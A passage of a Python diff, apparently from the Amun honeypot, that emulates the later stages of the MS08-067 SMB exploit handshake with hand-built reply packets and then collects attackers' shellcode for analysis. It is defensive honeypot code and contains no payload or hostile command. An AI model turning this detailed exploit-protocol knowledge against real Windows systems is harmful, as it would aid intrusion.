+				self.reply[61] = "\x00"
+				self.reply[62] = "\x00"
+				self.reply[63] = "\x00"
+				### last write
+				self.reply[64] = "\x00"
+				self.reply[65] = "\x00"
+				self.reply[66] = "\x00"
+				self.reply[67] = "\x00"
+				self.reply[68] = "\x00"
+				self.reply[69] = "\x00"
+				self.reply[70] = "\x00"
+				self.reply[71] = "\x00"
+				### change time
+				self.reply[71] = "\x00"
+				self.reply[72] = "\x00"
+				self.reply[73] = "\x00"
+				self.reply[74] = "\x00"
+				self.reply[75] = "\x00"
+				self.reply[76] = "\x00"
+				self.reply[77] = "\x00"
+				self.reply[78] = "\x00"
+				### file attributes
+				self.reply[79] = "\x80"
+				self.reply[80] = "\x00"
+				self.reply[81] = "\x00"
+				self.reply[82] = "\x00"
+				### allocation size
+				self.reply[83] = "\x00"
+				self.reply[84] = "\x10"
+				self.reply[85] = "\x00"
+				self.reply[86] = "\x00"
+				self.reply[87] = "\x00"
+				self.reply[88] = "\x00"
+				self.reply[89] = "\x00"
+				self.reply[90] = "\x00"
+				### end of file
+				self.reply[91] = "\x00"
+				self.reply[92] = "\x00"
+				self.reply[93] = "\x00"
+				self.reply[94] = "\x00"
+				self.reply[95] = "\x00"
+				self.reply[96] = "\x00"
+				self.reply[97] = "\x00"
+				self.reply[98] = "\x00"
+				self.reply[99] = "\x00"
+				### file type
+				self.reply[100] = "\x02"
+				self.reply[101] = "\x00"
+				### device state
+				self.reply[102] = "\xff"
+				self.reply[103] = "\x05"
+				### is directory?
+				self.reply[104] = "\x00"
+				### byte count
+				self.reply[105] = "\x00"
+				self.reply[106] = "\x00"
+				###
+				self.reply[107] = "\x00"
+				self.reply[108] = "\x00"
+				self.reply[109] = "\x00"
+				self.reply[110] = "\x00"
+				self.reply[111] = "\x00"
+				self.reply[112] = "\x00"
+				self.reply[113] = "\x00"
+				self.reply[114] = "\x00"
+				self.reply[115] = "\x00"
+				self.reply[116] = "\x00"
+				self.reply[117] = "\x00"
+				self.reply[118] = "\x00"
+				self.reply[119] = "\x00"
+				self.reply[120] = "\x00"
+				self.reply[121] = "\x00"
+				self.reply[122] = "\x00"
+				self.reply[123] = "\x00"
+				self.reply[124] = "\x00"
+				self.reply[125] = "\x00"
+				self.reply[126] = "\x00"
+				self.reply[127] = "\x00"
+				self.reply[128] = "\x9b"
+				self.reply[129] = "\x01"
+				self.reply[130] = "\x12"
+				self.reply[131] = "\x00"
+				self.reply[132] = "\x9b"
+				self.reply[133] = "\x01"
+				self.reply[134] = "\x12"
+				self.reply[135] = "\x00"
+				self.reply[136] = "\x00"
+				self.reply[137] = "\x00"
+
+				resultSet['reply'] = "".join(self.reply[2:138])
+				self.stage = "MS08067_STAGE5"
+				return resultSet
+			elif self.stage == "MS08067_STAGE5" and bytes==150:
+				print ".::[Amun - MS08-067 STAGE5] collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+				#print ">> Request:"
+				#self.print_message(message)
+				resultSet["result"] = True
+				resultSet["accept"] = True
+				### netbios header
+				self.reply[0] = "\x00"
+				self.reply[1] = "\x00"
+				self.reply[2] = "\x00"
+				### size -4
+				self.reply[3] = "\x7b"
+				### smb header
+				self.reply[4] = "\xff"
+				self.reply[5] = "\x53"
+				self.reply[6] = "\x4d"
+				self.reply[7] = "\x42"
+				### command (dialect name)
+				self.reply[8] = "\x25"
+				### error class
+				self.reply[9] = "\x00"
+				### reserved
+				self.reply[10] = "\x00"
+				### error code
+				self.reply[11] = "\x00"
+				self.reply[12] = "\x00"
+				### flag
+				self.reply[13] = "\x98"
+				### flag2
+				self.reply[14] = "\x01"
+				self.reply[15] = "\x20"
+				### extra
+				self.reply[16] = "\x00"
+				self.reply[17] = "\x00"
+				self.reply[18] = "\x00"
+				self.reply[19] = "\x00"
+				self.reply[20] = "\x00"
+				self.reply[21] = "\x00"
+				self.reply[22] = "\x00"
+				self.reply[23] = "\x00"
+				self.reply[24] = "\x00"
+				self.reply[25] = "\x00"
+				self.reply[26] = "\x00"
+				self.reply[27] = "\x00"
+				### tree ID
+				self.reply[28] = message[28]
+				self.reply[29] = message[29]
+				### pid
+				self.reply[30] = message[30]
+				self.reply[31] = message[31]
+				### uid
+				self.reply[32] = "\x00"
+				self.reply[33] = "\x08"
+				### mid
+				self.reply[34] = message[34]
+				self.reply[35] = message[35]
+				### word count
+				self.reply[36] = "\x0a"
+				###### parameter block
+				### total parameter count
+				self.reply[37] = "\x00"
+				self.reply[38] = "\x00"
+				### total data count
+				self.reply[39] = "\x44"
+				self.reply[40] = "\x00"
+				### reserved
+				self.reply[41] = "\x00"
+				self.reply[42] = "\x00"
+				### parameter count
+				self.reply[43] = "\x00"
+				self.reply[44] = "\x00"
+				### parameter offset
+				self.reply[45] = "\x38"
+				self.reply[46] = "\x00"
+				### parameter displacement
+				self.reply[47] = "\x00"
+				self.reply[48] = "\x00"
+				### data count
+				self.reply[49] = "\x44"
+				self.reply[50] = "\x00"
+				### data offset
+				self.reply[51] = "\x38"
+				self.reply[52] = "\x00"
+				### data displacment
+				self.reply[53] = "\x00"
+				self.reply[54] = "\x00"
+				### setup count
+				self.reply[55] = "\x00"
+				### reserved
+				self.reply[56] = "\x00"
+				### byte count
+				self.reply[57] = "\x45"
+				self.reply[58] = "\x00"
+				### padding
+				self.reply[59] = "\x00"
+				### pipe protocol
+				self.reply[60] = "\x05"
+				self.reply[61] = "\x00"
+				### packet type
+				self.reply[62] = "\x0c"
+				self.reply[63] = "\x03"
+				### packet flags
+				self.reply[64] = "\x10"
+				###
+				self.reply[65] = "\x00"
+				self.reply[66] = "\x00"
+				self.reply[67] = "\x00"
+				### frag length
+				self.reply[68] = "\x44"
+				self.reply[69] = "\x00"
+				### auth length
+				self.reply[70] = "\x00"
+				self.reply[71] = "\x00"
+				### call id
+				self.reply[71] = "\x01"
+				self.reply[72] = "\x00"
+				self.reply[73] = "\x00"
+				self.reply[74] = "\x00"
+				###
+				self.reply[75] = "\xb8"
+				self.reply[76] = "\x10"
+				###
+				self.reply[77] = "\xb8"
+				self.reply[78] = "\x10"
+				### assoc group
+				self.reply[79] = "\x17"
+				self.reply[80] = "\xa1"
+				self.reply[81] = "\x01"
+				self.reply[82] = "\x00"
+				### 
+				self.reply[83] = "\x0e"
+				self.reply[84] = "\x00"
+				###
+				self.reply[85] = "\x5c"
+				self.reply[86] = "\x50"
+				self.reply[87] = "\x49"
+				self.reply[88] = "\x50"
+				self.reply[89] = "\x45"
+				self.reply[90] = "\x5c"
+				self.reply[91] = "\x62"
+				self.reply[92] = "\x72"
+				self.reply[93] = "\x6f"
+				self.reply[94] = "\x77"
+				self.reply[95] = "\x73"
+				self.reply[96] = "\x65"
+				self.reply[97] = "\x72"
+				self.reply[98] = "\x00"
+				###
+				self.reply[99] = "\x01"
+				###
+				self.reply[100] = "\x00"
+				self.reply[101] = "\x00"
+				self.reply[102] = "\x00"
+				self.reply[103] = "\x00"
+				self.reply[104] = "\x00"
+				self.reply[105] = "\x00"
+				self.reply[106] = "\x00"
+				###
+				self.reply[107] = "\x04"
+				self.reply[108] = "\x5d"
+				self.reply[109] = "\x88"
+				self.reply[110] = "\x8a"
+				self.reply[111] = "\xeb"
+				self.reply[112] = "\x1c"
+				self.reply[113] = "\xc9"
+				self.reply[114] = "\x11"
+				self.reply[115] = "\x9f"
+				self.reply[116] = "\xe8"
+				self.reply[117] = "\x08"
+				self.reply[118] = "\x00"
+				self.reply[119] = "\x2b"
+				self.reply[120] = "\x10"
+				self.reply[121] = "\x48"
+				self.reply[122] = "\x60"
+				self.reply[123] = "\x02"
+				self.reply[124] = "\x00"
+				self.reply[125] = "\x00"
+				self.reply[126] = "\x00"
+
+				resultSet['reply'] = "".join(self.reply[2:127])
+				self.stage = "SHELLCODE"
+				return resultSet
+			elif self.stage == "SHELLCODE":
+				if bytes>0:
+					#print ".::[Amun - Analyzer] collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+					resultSet["result"] = True
+					resultSet["accept"] = True
+					resultSet['reply'] = "".join(self.reply)
+					self.shellcode.append(message)
+					self.stage = "SHELLCODE"
+					#resultSet["shellcode"] = "".join(self.shellcode)
+					return resultSet
+				else:
+					#print ".::[Amun - Analyzer] finish collecting shellcode (bytes %s ip %s) ::." % (bytes,ip)
+					resultSet["result"] = False
+					resultSet["accept"] = True
+					resultSet["reply"] = "None"
+					self.shellcode.append(message)
+					resultSet["shellcode"] = "".join(self.shellcode)
+					return resultSet
+			else:
+				resultSet["result"] = False
+				resultSet["accept"] = False
+				resultSet["reply"] = "None"
+				return resultSet
+			return resultSet
+		except KeyboardInterrupt:
+			raise
+		except StandardError, e:
+			print e
+		except:
+			print "Analyzer fatal error"
